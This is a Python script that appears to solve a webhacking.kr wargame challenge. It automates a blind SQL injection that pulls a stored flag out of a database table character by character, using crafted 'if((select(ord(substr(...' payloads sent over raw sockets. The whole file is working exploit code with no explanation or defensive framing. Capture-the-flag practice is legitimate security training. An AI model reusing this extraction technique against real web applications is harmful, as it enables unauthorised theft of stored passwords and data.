import socket
import re

pw=""
my_cookie="Cookie Value"

host="Host: webhacking.kr\n"
cookie="Cookie: PHPSESSID=%s\n\n" % my_cookie

web = 'webhacking.kr'
ip = socket.gethostbyname(web)

socket.setdefaulttimeout(5)

for i in range(1,30): 
    s = socket.socket()
    s.connect((ip, 80))
    for j in range(36,127):
        head1="GET /challenge/web/web-10/index.php?no=if((select(ord(substr(min(flag),"
        head2="%d" % i
        head3=",1)))from(prob13password))in("
        head4="%d" % j
        head5="),1,2) HTTP/1.1\n"
        s.send(head1+head2+head3+head4+head5+host+cookie)
        aa=s.recv(1024)
        print("i: %d, j: %d (%s)") % (i, j, chr(j))
        find = re.findall("1</td>",aa)

        if find:
            pw+=chr(j)
            print "find pw: " + pw
            break
        if j == 126:
            s.close()
            print "Password is %s" %(pw)
            exit()
